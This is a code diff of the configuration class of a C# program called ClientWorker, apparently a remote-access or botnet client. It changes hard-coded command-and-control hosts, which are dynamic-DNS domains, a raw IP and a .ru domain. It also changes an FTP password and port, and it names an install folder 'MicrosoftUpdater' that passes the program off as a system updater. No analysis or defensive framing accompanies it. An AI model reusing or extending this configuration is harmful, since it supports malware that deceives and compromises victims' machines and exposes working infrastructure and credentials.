@@ -11,8 +11,8 @@ namespace ClientWorker
 		public static string currentServer = "fokes1.ddns.net";
         public static int port = 7777;
         public static string ftpUser = "ff";
-		public static string ftpPass = "WorkerFF";
-		public static int ftpPort = 21;
+		public static string ftpPass = "oTEDLaRbXg";
+		public static int ftpPort = 21345;
 		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
 		public static string service = "Service.exe";
 		public static string updater = "Updater.exe";
@@ -22,9 +22,10 @@ namespace ClientWorker
 
         public static List<string> ddnsHostName = new List<string>
 		{
-			"fokes1.asuscomm.com",
+            "fokes1.ddns.net",
+            "185.228.233.199",
             "fizerfox.ru",
-            "fokes1.ddns.net"
+			"fokes1.asuscomm.com"
 		};
 
 		public static List<string> listFiles = new List<string>
